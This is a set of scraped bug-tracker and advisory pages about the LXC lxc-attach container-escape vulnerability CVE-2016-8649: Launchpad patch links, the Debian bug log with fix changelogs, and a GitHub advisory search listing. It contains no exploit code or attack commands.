* [LXC patch for stable-2.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-2.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779384 "Change patch details")
* [LXC patch for stable-1.0.](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385/%2Bfiles/0001-attach-do-not-send-procfd-to-attached-process_stable-1.0.patch)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4779385 "Change patch details")

* [Add patch](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddcomment?field.patch=on)

## Bug attachments

* [LxcAttachEscape.c](https://bugs.launchpad.net/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615/%2Bfiles/LxcAttachEscape.c)
  [Edit](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Battachment/4772615 "Change attachment details")

* [Add attachment](/ubuntu/%2Bsource/lxc/%2Bbug/1639345/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugs.gentoo.org_17ede754_20250126_010258.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Invalid Bug ID

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=CVE&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=CVE&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

'CVE' is not a valid bug number
nor an alias to a bug.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=CVE&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=CVE&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.debian.org_75678828_20250126_010313.html ===

# Debian Bug report logs - #845465 lxc: CVE-2016-8649: attach: do not send procfd to attached process

[![version graph](version.cgi?package=src%3Alxc;absolute=0;found=lxc%2F1%3A1.0.6-6%2Bdeb8u4;found=lxc%2F1%3A2.0.5-3;found=lxc%2F1%3A1.0.6-6%2Bdeb8u3;fixed=lxc%2F1%3A2.0.6-1;fixed=lxc%2F1%3A1.0.6-6%2Bdeb8u5;width=2;collapse=1;height=2)](version.cgi?info=1;absolute=0;collapse=1;fixed=lxc%2F1%3A2.0.6-1;fixed=lxc%2F1%3A1.0.6-6%2Bdeb8u5;package=src%3Alxc;found=lxc%2F1%3A1.0.6-6%2Bdeb8u4;found=lxc%2F1%3A2.0.5-3;found=lxc%2F1%3A1.0.6-6%2Bdeb8u3)

Package:
[src:lxc](pkgreport.cgi?src=lxc);
Maintainer for [src:lxc](pkgreport.cgi?src=lxc) is [pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>](pkgreport.cgi?maint=pkg-lxc-devel%40lists.alioth.debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Wed, 23 Nov 2016 18:09:01 UTC

Severity: important

Tags: patch, security, upstream

Found in versions lxc/1:1.0.6-6+deb8u4, lxc/1:2.0.5-3, lxc/1:1.0.6-6+deb8u3

Fixed in versions lxc/1:2.0.6-1, lxc/1:1.0.6-6+deb8u5

**Done:** Evgeni Golov <evgeni@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=845465;mbox=yes), [status mbox](bugreport.cgi?bug=845465;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=845465;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>`:

`Bug#845465`; Package `src:lxc`.
(Wed, 23 Nov 2016 18:09:04 GMT) ([full text](bugreport.cgi?bug=845465;msg=2), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>`.
(Wed, 23 Nov 2016 18:09:04 GMT) ([full text](bugreport.cgi?bug=845465;msg=4), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=5), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: lxc: CVE-2016-8649: attach: do not send procfd to attached process
Date: Wed, 23 Nov 2016 19:06:45 +0100
```
Source: lxc
Version: 1:2.0.5-3
Severity: important
Tags: security upstream patch

Hi,

the following vulnerability was published for lxc.

[CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)[0]:
lxc-attach to malicious container allows access to host

If you fix the vulnerability please also make sure to include the
CVE (Common Vulnerabilities & Exposures) id in your changelog entry.

For further information see:

[0] <https://security-tracker.debian.org/tracker/CVE-2016-8649>
[1] <https://github.com/lxc/lxc/commit/81f466d05f2a89cb4f122ef7f593ff3f279b165c>
[2] <https://launchpad.net/bugs/1639345>
[3] <http://www.openwall.com/lists/oss-security/2016/11/23/6>

Please adjust the affected versions in the BTS as needed.

Regards,
Salvatore

```

---

**Marked as found in versions lxc/1:1.0.6-6+deb8u3.**
Request was from `Evgeni Golov <evgeni@debian.org>`
to `control@bugs.debian.org`.
(Thu, 24 Nov 2016 07:45:02 GMT) ([full text](bugreport.cgi?bug=845465;msg=7), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=7), [link](#6)).

---

**Marked as found in versions lxc/1:1.0.6-6+deb8u4.**
Request was from `Evgeni Golov <evgeni@debian.org>`
to `control@bugs.debian.org`.
(Thu, 24 Nov 2016 07:45:05 GMT) ([full text](bugreport.cgi?bug=845465;msg=9), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=9), [link](#8)).

---

**Reply sent**
to `Evgeni Golov <evgeni@debian.org>`:

You have taken responsibility.
(Thu, 24 Nov 2016 07:51:12 GMT) ([full text](bugreport.cgi?bug=845465;msg=11), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=11), [link](#10)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Thu, 24 Nov 2016 07:51:12 GMT) ([full text](bugreport.cgi?bug=845465;msg=13), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 845465-close@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=14), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=evgeni%40debian.org)
From: Evgeni Golov <evgeni@debian.org>
To: 845465-close@bugs.debian.org
Subject: Bug#845465: fixed in lxc 1:2.0.6-1
Date: Thu, 24 Nov 2016 07:48:49 +0000
```
Source: lxc
Source-Version: 1:2.0.6-1

We believe that the bug you reported is fixed in the latest version of
lxc, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 845465@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Evgeni Golov <evgeni@debian.org> (supplier of updated lxc package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 24 Nov 2016 08:07:02 +0100
Source: lxc
Binary: lxc lxc-dev lxc-tests liblxc1 python3-lxc lua-lxc
Architecture: source
Version: 1:2.0.6-1
Distribution: unstable
Urgency: high
Maintainer: pkg-lxc <pkg-lxc-devel@lists.alioth.debian.org>
Changed-By: Evgeni Golov <evgeni@debian.org>
Description:
 liblxc1    - Linux Containers userspace tools (library)
 lua-lxc    - Linux Containers userspace tools (Lua bindings)
 lxc        - Linux Containers userspace tools
 lxc-dev    - Linux Containers userspace tools (development)
 lxc-tests  - Linux Containers userspace tools (test binaries)
 python3-lxc - Linux Containers userspace tools (Python 3.x bindings)
Closes: [844086](bugreport.cgi?bug=844086) [845465](bugreport.cgi?bug=845465)
Changes:
 lxc (1:2.0.6-1) unstable; urgency=high
 .
   * New upstream version 2.0.6
     + attach: do not send procfd to attached process
       Closes: #[845465](bugreport.cgi?bug=845465)
       [CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)
   * liblxc1: add depends on cgroupfs-mount | systemd (Closes: #[844086](bugreport.cgi?bug=844086))
   * drop patches applied/imported upstream
   * debian/tests: add iptables to tests depends
Checksums-Sha1:
 8f448b9149d9476ffc66320b56adf7bf10db0c4a 2602 lxc_2.0.6-1.dsc
 d69a6652ea0a5093337e5b5ef0d71e42f15fddfc 1300046 lxc_2.0.6.orig.tar.gz
 28181919b4fc08cb1ae2c06049e3fd191e8837ab 82712 lxc_2.0.6-1.debian.tar.xz
Checksums-Sha256:
 df109fc74c5fe859133d0be7609e03c359996141e11530be3be3abadb05f9d67 2602 lxc_2.0.6-1.dsc
 7c292cd0055dac1a0e6fbb6a7740fd12b6ffb204603c198faf37c11c9d6dcd7a 1300046 lxc_2.0.6.orig.tar.gz
 a65861f37bf1b92e98ebc08228b7a22c5641c1f4a5137888edf8641f9ef1f6b6 82712 lxc_2.0.6-1.debian.tar.xz
Files:
 8083b6ae51a17471c9b1252599133ffb 2602 admin optional lxc_2.0.6-1.dsc
 5fd4b7af8026e8ae20b3065ee18fe974 1300046 admin optional lxc_2.0.6.orig.tar.gz
 7bd32a48e88afba989506c83971f58e5 82712 admin optional lxc_2.0.6-1.debian.tar.xz

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEExXWpV+gZuhi/B+dmobCbQjM5YegFAlg2ltcACgkQobCbQjM5
Yeh8YxAAjcN9Iw63oZ0xnI38GnaynZ8qnlomng9yc6HUM7sQsxNCs718u/p1KQ4i
Q6v1h0alUxkJhVQth+xd9oYHS/lFKbvYbc4BBrDneB3eJv24vyMSJGqd3ad69HVw
h2HPt5RaAti24SfoDaZ0ErOZYp4GeUYvQaONP5/hg+/etbkDabzFf8kSOB17AYon
QvNPoY7Dg9S0jej6NzZbXTmnmsD2rIhSODyEelfB243EYosh+t6AQtc/9z1SWRB4
RjsiLQzyO1xJ3+qGE4aOcBruZUHs6v9DaFqyUixMi+Nj3GVLstAxgkhDVVoZ7+oF
gk+2hvqTu7juU+UJFA/KF7W7UXbD5iYkuEebH/AtoQO3floryxKm0Bu01oNshI/j
gd/C+KbYzSGa43xVwkWvHqTiYt1pJTIIAL9F+YaPLmU3cUmgv2ny9s+/o1L3ERZJ
ZzASEXqcfS4ZNsG0tflYXSQwySqiUo1Wbioyjiusx7P+FHRgoRLw2tQABbHvDddG
MEED19HZaR0WFjqGFPoZkZ4IZQPlnTybltzc8W/gLmrt3I10dssRg0lg266POnvE
A0kiSbujimivO0mAFx0flmNaD1glQycoVJIWe2Z006xtCYDvoJ8/QaNf/HAJfDO6
WialtANnWV1tdgyIF0jQqxEgPZJU+4JHcZ2UKSnRx8aduwqQrqc=
=IR8F
-----END PGP SIGNATURE-----

```

---

**Reply sent**
to `Evgeni Golov <evgeni@debian.org>`:

You have taken responsibility.
(Wed, 14 Dec 2016 21:06:11 GMT) ([full text](bugreport.cgi?bug=845465;msg=16), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=16), [link](#15)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Wed, 14 Dec 2016 21:06:11 GMT) ([full text](bugreport.cgi?bug=845465;msg=18), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=18), [link](#17)).

---

[Message #19](#19) received at 845465-close@bugs.debian.org ([full text](bugreport.cgi?bug=845465;msg=19), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=19), reply):

![](/cgi-bin/libravatar.cgi?email=evgeni%40debian.org)
From: Evgeni Golov <evgeni@debian.org>
To: 845465-close@bugs.debian.org
Subject: Bug#845465: fixed in lxc 1:1.0.6-6+deb8u5
Date: Wed, 14 Dec 2016 21:03:40 +0000
```
Source: lxc
Source-Version: 1:1.0.6-6+deb8u5

We believe that the bug you reported is fixed in the latest version of
lxc, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 845465@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Evgeni Golov <evgeni@debian.org> (supplier of updated lxc package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

Format: 1.8
Date: Thu, 24 Nov 2016 08:14:36 +0100
Source: lxc
Binary: lxc lxc-dbg
Architecture: source amd64
Version: 1:1.0.6-6+deb8u5
Distribution: jessie
Urgency: medium
Maintainer: Daniel Baumann <mail@daniel-baumann.ch>
Changed-By: Evgeni Golov <evgeni@debian.org>
Description:
 lxc        - Linux Containers userspace tools
 lxc-dbg    - Linux Containers userspace tools (debug)
Closes: [845465](bugreport.cgi?bug=845465)
Changes:
 lxc (1:1.0.6-6+deb8u5) jessie; urgency=medium
 .
   * attach: do not send procfd to attached process
     Closes: #[845465](bugreport.cgi?bug=845465)
     [CVE-2016-8649](https://security-tracker.debian.org/tracker/CVE-2016-8649)
Checksums-Sha1:
 46934dc754f05f9d49de798395710a9538f80851 2096 lxc_1.0.6-6+deb8u5.dsc
 4e54a6f3e4d8a47da9d5b56cc8c8ac1f545e668f 38832 lxc_1.0.6-6+deb8u5.debian.tar.xz
 4a0470f184a50e8b2ae422696921d0bd1d7211fd 626464 lxc_1.0.6-6+deb8u5_amd64.deb
 c73f98355070c4ce9ef8fae50f973b85963400bc 774306 lxc-dbg_1.0.6-6+deb8u5_amd64.deb
Checksums-Sha256:
 dd0bf86b4ecf2afea298fe011276bd9273485e941c600bee9df17a51378a5020 2096 lxc_1.0.6-6+deb8u5.dsc
 ef8fb16916aa78a1f902a5fd465610f6901944e76fbb359e3c131180b8954d64 38832 lxc_1.0.6-6+deb8u5.debian.tar.xz
 75c3e39fd3d86a087c2ea3e5a6f4e4e87581f9d3546cc31f954d242c50c7da82 626464 lxc_1.0.6-6+deb8u5_amd64.deb
 cd32792c96b70aab46b37b3d75a80975e94908d543fe922ef03ff2a3a3eb42e2 774306 lxc-dbg_1.0.6-6+deb8u5_amd64.deb
Files:
 f1de463853b312181de134632218592f 2096 admin optional lxc_1.0.6-6+deb8u5.dsc
 4da0ce5d2cfb870b0b2a3d4203c9f1b7 38832 admin optional lxc_1.0.6-6+deb8u5.debian.tar.xz
 5eb94e3bdfd758e62d4215a122101fda 626464 admin optional lxc_1.0.6-6+deb8u5_amd64.deb
 0232a1ff861631bcce9cf0a5504d0ab3 774306 debug extra lxc-dbg_1.0.6-6+deb8u5_amd64.deb

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEEst7mYDbECCn80PEM/A2xu81GC94FAlhOpQQACgkQ/A2xu81G
C96Cug/7Bpjika+M9y9dstR0I/V/TOIHjsWJm0t2c1dOlWBgAZProLnqDPd+YxFB
wxykBE5y3Adn3IVZkq5w94vyZW2FGZPKKdajEBz63KmCMEeqWm0yCOmpzv+b10S4
ObMkDmYxXLoXY1kN4/ILa8iNwmPzrw981F47XrHGjFox6l7osmjHrT9HEgAPemsl
RqYEss9M6dnNmUKQt1KcBrjF8Qx15e+4LrlW+rjJmVD2zjGo/ZQ10A4brrtpUpK5
dQKpeugs6O2o9UqM+o5fqRAB+iHALHrLmCsf3g6yH9a+DtHiMlm3coWXPXubEXwq
KMjEH6fy30GX24KmYhiup8RGKHcP1NjidXYp7FLSIumLShDIlHTJu6qOTfpBKDLM
ez74Mhz3F0UTg/eBUN6Ed3u12PaCxxVQJqNVir96jmSmhA9XItVpP1g3JTRFf1xC
iqFtooKqYTFCOWw/PSmr+alHCYl/wRfD/1TqYaHi0VWCe9tbsRgDgCLxfZmpwGXg
gKpd3c5dE1VE/Ah3GwLYsUia51nld3rD/Kb2MI5stqrnhMbO98rplJ6shMk/g9nG
P08W5VrtrdsT78p/sOi7q/0otTu4/xtjjufxz/IHdqais3r2rlzEadDitJCCuUYp
C0bi4/F8PoJKzVlrIMhEvnfkaMWk2X3uaqEy3yY/yuE2hvsgtX0=
=uEya
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Fri, 27 Jan 2017 10:33:56 GMT) ([full text](bugreport.cgi?bug=845465;msg=21), [mbox](bugreport.cgi?bug=845465;mbox=yes;msg=21), [link](#20)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=845465).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sun Jan 26 01:03:13 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from github.com_e340f208_20250126_010317.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2016-86)

**GitHub Advisory Database**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2016-86)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# GitHub Advisory Database

Security vulnerability database inclusive of CVEs and GitHub originated security advisories from the world of open source software.

## GitHub reviewed advisories

* [All reviewed
  21,144](/advisories?query=CVE-2016-86+type%3Areviewed)
* [Composer
  4,333](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Acomposer)
* [Erlang
  31](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aerlang)
* [GitHub Actions
  22](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aactions)
* [Go
  2,095](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Ago)
* [Maven
  5,265](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Amaven)
* [npm
  3,760](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Anpm)
* [NuGet
  678](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Anuget)
* [pip
  3,446](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Apip)
* [Pub
  12](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Apub)
* [RubyGems
  892](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Arubygems)
* [Rust
  882](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Arust)
* [Swift
  37](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aswift)

## Unreviewed advisories

* [All unreviewed
  242,536](/advisories?query=CVE-2016-86+type%3Aunreviewed)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

Filter advisories

### Filter advisories

GitHub reviewed advisories
[All reviewed

5,000+](/advisories?query=CVE-2016-86+type%3Areviewed)
[Composer

4,333](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Acomposer)
[Erlang

31](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aerlang)
[GitHub Actions

22](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aactions)
[Go

2,095](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Ago)
[Maven

5,000+](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Amaven)
[npm

3,760](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Anpm)
[NuGet

678](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Anuget)
[pip

3,446](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Apip)
[Pub

12](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Apub)
[RubyGems

892](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Arubygems)
[Rust

882](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Arust)
[Swift

37](/advisories?query=CVE-2016-86+type%3Areviewed+ecosystem%3Aswift)
Unreviewed advisories
[All unreviewed

5,000+](/advisories?query=CVE-2016-86+type%3Aunreviewed)

 Search

## 22 advisories

Filter by severity
Filter by CWE
Sort by

Severity

Filter by severity

[All severities](/advisories?query=CVE-2016-86)
[Low](/advisories?query=CVE-2016-86+severity%3Alow)
[Moderate](/advisories?query=CVE-2016-86+severity%3Amoderate)
[High](/advisories?query=CVE-2016-86+severity%3Ahigh)
[Critical](/advisories?query=CVE-2016-86+severity%3Acritical)

CWE

 Loading

Sort

Sort by

[Newest](/advisories?query=CVE-2016-86)
[Oldest](/advisories?query=CVE-2016-86+sort%3Apublished-asc)
[Recently updated](/advisories?query=CVE-2016-86+sort%3Aupdated-desc)
[Least recently updated](/advisories?query=CVE-2016-86+sort%3Aupdated-asc)

[Certain NETGEAR devices are affected by command injection by an unauthenticated attacker. This...](/advisories/GHSA-m25v-6jm5-xmw4)
High

Unreviewed

CVE-2018-21162

was published
May 24, 2022

[cPanel before 11.54.0.4 allows stored XSS in the WHM Feature Manager interface (SEC-86).](/advisories/GHSA-q2v7-x93j-phm7)
Moderate

Unreviewed

CVE-2016-10853

was published
May 24, 2022

[Multiple cross-site request forgery (CSRF) vulnerabilities in the Mail interface in Zimbra...](/advisories/GHSA-2rv3-6v8p-2p2m)
High

Unreviewed

CVE-2015-6541

was published
May 17, 2022

[Directory traversal vulnerability in SAP TREX 7.10 Revision 63 allows remote attackers to read...](/advisories/GHSA-mw9p-6qwg-m87v)
Critical

Unreviewed

CVE-2016-6138

was published
May 17, 2022

[SONY SNC-CH115, SNC-CH120, SNC-CH160, SNC-CH220, SNC-CH260, SNC-DH120, SNC-DH120T, SNC-DH160, SNC...](/advisories/GHSA-7h9h-5rpv-h4gq)
High

Unreviewed

CVE-2016-7834

was published
May 17, 2022

[Exim before 4.86.2, when installed setuid root, allows local users to gain privileges via the...](/advisories/GHSA-qqgw-xrxj-r5fc)
High

Unreviewed

CVE-2016-1531

was published
May 17, 2022

[Swift Mailer mail transport Command Injection](/advisories/GHSA-pr44-4jfr-286m)
Critical

CVE-2016-10074

was published
for
swiftmailer/swiftmailer

(Composer)
May 17, 2022

[Mozilla Firefox before 48.0, Firefox ESR < 45.4 and Thunderbird < 45.4 allow remote attackers to...](/advisories/GHSA-w8fm-f723-jm45)
Moderate

Unreviewed

CVE-2016-5250

was published
May 14, 2022

[Integer overflow in the WebSocketChannel class in the WebSockets subsystem in Mozilla Firefox...](/advisories/GHSA-jrqh-qj76-c265)
High

Unreviewed

CVE-2016-5261

was published
May 14, 2022

[The nsImageGeometryMixin class in Mozilla Firefox before 49.0, Firefox ESR 45.x before 45.4, and...](/advisories/GHSA-9vc8-w555-j964)
High

Unreviewed

CVE-2016-5272

was published
May 14, 2022

[Heap-based buffer overflow in the nsBMPEncoder::AddImageFrame function in Mozilla Firefox before...](/advisories/GHSA-jf8q-fmcm-x642)
High

Unreviewed

CVE-2016-5278

was published
May 14, 2022

[Heap-based buffer overflow in the nsCaseTransformTextRunFactory::TransformString function in...](/advisories/GHSA-2hcj-223m-pqx5)
Critical

Unreviewed

CVE-2016-5270

was published
May 14, 2022

[Use-after-free vulnerability in the nsRefreshDriver::Tick function in Mozilla Firefox before 49.0...](/advisories/GHSA-25gr-ph8w-33hc)
Critical

Unreviewed

CVE-2016-5277

was published
May 14, 2022

[Multiple unspecified vulnerabilities in the browser engine in Mozilla Firefox before 49.0,...](/advisories/GHSA-3vmp-cwhr-32wm)
Critical

Unreviewed

CVE-2016-5257

was published
May 14, 2022

